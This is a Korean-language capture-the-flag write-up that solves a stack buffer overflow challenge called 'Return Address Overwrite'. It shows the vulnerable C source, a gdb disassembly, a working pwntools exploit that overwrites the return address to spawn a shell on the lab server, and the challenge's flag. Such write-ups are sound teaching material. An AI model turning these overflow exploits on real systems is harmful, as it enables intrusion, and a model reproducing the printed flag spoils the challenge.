https://honey-push-30b.notion.site/Return-Address-Overwrite-2ec4225d4b084d999f629c1f6ba0d099
# 문제파일 다운로드

![문제파일다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1c5529c6-19d4-44a3-b5a4-c0a2c7fc8bb4/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

Rreturn Address Overwrite의 문제파일을 다운로드 받으면 rao.c 파일과 gdb로 열 rao파일을 받을 수 있는데 먼저 c파일을 열어 코드를 확인하면 아래와 같다.

```python
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

buf 값에 입력값을 받는데 입력값의 크기를 검증하지 않아 ret 값을 덮어 씌울 수 있다. 그 ret 주소를 get_shell의 주소로 덮어 씌운다면 get_shell 함수를 실행시켜 쉘을 딸 수 있다.

```python
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x30
   0x00000000004006f0 <+8>:     mov    eax,0x0
   0x00000000004006f5 <+13>:    call   0x400667 <init>
   0x00000000004006fa <+18>:    lea    rdi,[rip+0xbb]        # 0x4007bc
   0x0000000000400701 <+25>:    mov    eax,0x0
   0x0000000000400706 <+30>:    call   0x400540 <printf@plt>
   0x000000000040070b <+35>:    lea    rax,[rbp-0x30]
   0x000000000040070f <+39>:    mov    rsi,rax
   0x0000000000400712 <+42>:    lea    rdi,[rip+0xab]        # 0x4007c4
   0x0000000000400719 <+49>:    mov    eax,0x0
   0x000000000040071e <+54>:    call   0x400570 <__isoc99_scanf@plt>
   0x0000000000400723 <+59>:    mov    eax,0x0
   0x0000000000400728 <+64>:    leave  
   0x0000000000400729 <+65>:    ret    
End of assembler dump.
```

gdb를 이용하여 main 함수를 켜본 결과 main+4에서 sub rsp 0x30을 통해 0x30만큼 버퍼의 크기를 확보해 주는 것을 볼 수 있다. 따라서

버퍼 0x30

SFP 8바이트

RET 8바이트

로 구성되어 있으므로 총 입력값은 0x30(버퍼)만큼 채운뒤 0x8(SFP)만큼 더 채우고 get_shell의 주소를 8바이트 형태로 입력하면 된다.

```python
gdb-peda$ print get_shell
$1 = {<text variable, no debug info>} 0x4006aa <get_shell>
```

get_shell의 주소를 print를 통해 알아내면 0x4006aa임을 알 수 있다.

```python
from pwn import *

p= remote('host3.dreamhack.games',10830)
address=p64(0x4006aa)

payload= b'A'*0x30
payload+=b'A'*0x8
payload+=address

p.sendlineafter("Input: ",payload)

p.interactive()
```

pwntools를 이용하여 exploit 코드를 작성하면

payload는 3단계로 구성된다.

버퍼를 덮을 0x30 만큼의 A(바이트형태)

SFP를 덮을 0x8만큼의 A(바이트 형태)

ret을 덮을 64비트 형태의(0x4006aa) p64를 이용하면 16진수 값의 주소를 알아서 리틀 엔디언으로 64비트 형태로 만들어 준다.

이제 연결 후 Input: 값이 출력되면 payload를 전송한 후 그 결과를 interactive로 받아준다. 

```python
└─# python3 ./answer.py                                                2 ⨯
[+] Opening connection to host3.dreamhack.games on port 10830: Done
/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ ls
flag
rao
run.sh
$ cat flag
DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}
[*] Got EOF while reading in interactive
$
```

정상적으로 쉘을 이용할 수 있게 되어 ls를 통해 flag 파일이 있음을 알아내고 cat flag를 통해 flag 파일에 저장된 `DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}`를 알아냈다.
